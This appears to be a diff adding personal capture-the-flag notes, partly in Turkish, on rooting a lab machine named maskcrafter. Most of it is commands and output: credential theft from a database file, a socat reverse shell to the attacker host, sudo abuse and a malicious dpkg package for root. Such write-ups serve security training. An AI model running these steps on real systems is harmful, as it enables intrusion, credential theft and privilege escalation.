@@ -84,12 +84,135 @@ www-data@ubuntu:/tmp$ sudo su
 
 
 
+lets make it a tty shell:
+export TERM=xterm
+python -c 'import pty;pty.spawn("/bin/bash")'
+cltr+z
+stty raw -echo
+fg enter enter
+
+
+sql injecktion
+/var/www/html/db.php
+cat db.php  sifre mevcut icinde
+mysql -u web -p
+mysql> show databases;
+mysql> use istenen veritabani adi;
+mysql> show tables;
+mysql> select * from creds `istenen tablo adi creds`
+
+unzip cred.zip
+
+
+curl -u admin:admin -v -X OPTIONS http://192.168.189.134/debug 
 
 
 
 
+
+
+root@kali:~# ssh userx@192.168.189.134
+The authenticity of host '192.168.189.134 (192.168.189.134)' can't be established.
+ECDSA key fingerprint is SHA256:SvBMn4cnOBzrZkZQxsuOY8Qnxolc9AJJ6U7PeN299aU.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? y
+Please type 'yes', 'no' or the fingerprint: yes  
+Warning: Permanently added '192.168.189.134' (ECDSA) to the list of known hosts.
+userx@192.168.189.134's password: 
+Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-91-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  System information as of Sun Apr 12 20:53:38 UTC 2020
+
+  System load:  0.24               Processes:            199
+  Usage of /:   29.7% of 19.56GB   Users logged in:      0
+  Memory usage: 30%                IP address for ens33: 192.168.189.134
+  Swap usage:   0%
+
+ * Kubernetes 1.18 GA is now available! See https://microk8s.io for docs or
+   install it with:
+
+     sudo snap install microk8s --channel=1.18 --classic
+
+ * Multipass 1.1 adds proxy support for developers behind enterprise
+   firewalls. Rapid prototyping for cloud operations just got easier.
+
+     https://multipass.run/
+
+61 packages can be updated.
+0 updates are security updates.
+
+
+*** System restart required ***
+Last login: Mon Mar 30 03:33:23 2020 from 192.168.218.143
+userx@maskcrafter:~$ 
+userx@maskcrafter:~$ echo '/bin/bash' >> whatsmyid.sh
+userx@maskcrafter:~$ sudo -l
+Matching Defaults entries for userx on maskcrafter:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User userx may run the following commands on maskcrafter:
+    (evdaez) NOPASSWD: /scripts/whatsmyid.sh
+    
+sudo -u evdaez /scripts/whatsmyid.sh
+sudo -u evdaez
+sudo -l
+
+serx@maskcrafter:~$ sudo -u evdaez /scripts/whatsmyid.sh
+/scripts/whatsmyid.sh: 1: /scripts/whatsmyid.sh: ‘/bin/bash’: Permission denied
+bash: /home/userx/.bashrc: Permission denied
+evdaez@maskcrafter:~$ sudo -l
+Matching Defaults entries for evdaez on maskcrafter:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User evdaez may run the following commands on maskcrafter:
+    (researcherx) NOPASSWD: /usr/bin/socat
+
+
+sudo -u researcherx socat tcp-connect:192.168.189.128:12345 exec:sh,pty,stderr,setsid,sigint,sane
 
  
+start a listener on attacker side with :
+socat file:`tty`,raw,echo=0 tcp-listen:12345
+
+
+
+
+root@kali:~# socat file:`tty`,raw,echo=0 tcp-listen:12344
+sh: 0: can't access tty; job control turned off
+$ ls
+ls: cannot open directory '.': Permission denied
+$ l^H^H^H^[[2~^[[3~^[[F^H^H^H^H^H^H^H^H^H
+: not found
+$ id
+uid=1001(researcherx) gid=1001(researcherx) groups=1001(researcherx),4(adm),24(cdrom),30(dip),46(plugdev),108(lxd)
+$ python -c ‘import pty;pty.spawn(“/bin/bash”)’
+sh: 4: Syntax error: word unexpected (expecting ")")
+$ python -c 'import pty;pty.spawn("/bin/bash")'
+bash: /home/userx/.bashrc: Permission denied
+researcherx@maskcrafter:~$ id
+uid=1001(researcherx) gid=1001(researcherx) groups=1001(researcherx),4(adm),24(cdrom),30(dip),46(plugdev),108(lxd)
+researcherx@maskcrafter:~$ ls
+ls: cannot open directory '.': Permission denied
+researcherx@maskcrafter:~$ sudo -l
+Matching Defaults entries for researcherx on maskcrafter:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User researcherx may run the following commands on maskcrafter:
+    (ALL) NOPASSWD: /usr/bin/dpkg
+researcherx@maskcrafter:~$ 
+
+
+sudo dpkg :
+cd /tmp
+TF=$(mktemp -d)
+echo 'exec /bin/sh' > $TF/x.sh
+fpm -n x -s dir -t deb -a all --before-install $TF/x.sh $TF
+
+sudo dpkg -i x_1.0_all.deb
 
 
 
